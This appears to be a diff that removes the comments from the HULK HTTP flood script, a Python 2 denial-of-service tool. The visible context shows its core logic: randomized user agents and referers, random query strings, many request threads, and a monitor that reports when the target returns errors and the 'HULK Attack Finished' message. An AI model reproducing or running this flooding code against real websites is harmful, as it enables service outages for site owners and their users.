@@ -7,7 +7,7 @@ import threading
 import random
 import re
 
-#global params
+
 url=''
 host=''
 headers_useragents=[]
@@ -28,7 +28,7 @@ def set_safe():
 	global safe
 	safe=1
 
-# generates a user agent array
+
 def useragent_list():
 	global headers_useragents
 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
@@ -45,7 +45,7 @@ def useragent_list():
 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
 	return(headers_useragents)
 
-# generates a referer array
+
 def referer_list():
 	global headers_referers
 	headers_referers.append('http://www.google.com/?q=')
@@ -54,7 +54,7 @@ def referer_list():
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 
-#builds random ascii string
+
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
@@ -69,7 +69,7 @@ def usage():
 	print '---------------------------------------------------'
 
 
-#http request
+
 def httpcall(url):
 	useragent_list()
 	referer_list()
@@ -89,12 +89,12 @@ def httpcall(url):
 	try:
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
-			#print e.code
+
 			set_flag(1)
 			print 'Response Code 500'
 			code=500
 	except urllib2.URLError, e:
-			#print e.reason
+
 			sys.exit()
 	else:
 			inc_counter()
@@ -102,7 +102,7 @@ def httpcall(url):
 	return(code)
 
 
-#http caller thread
+
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
@@ -113,7 +113,7 @@ class HTTPThread(threading.Thread):
 		except Exception, ex:
 			pass
 
-# monitors http threads and counts requests
+
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
@@ -124,7 +124,7 @@ class MonitorThread(threading.Thread):
 		if flag==2:
 			print "\n-- HULK Attack Finished --"
 
-#execute
+
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
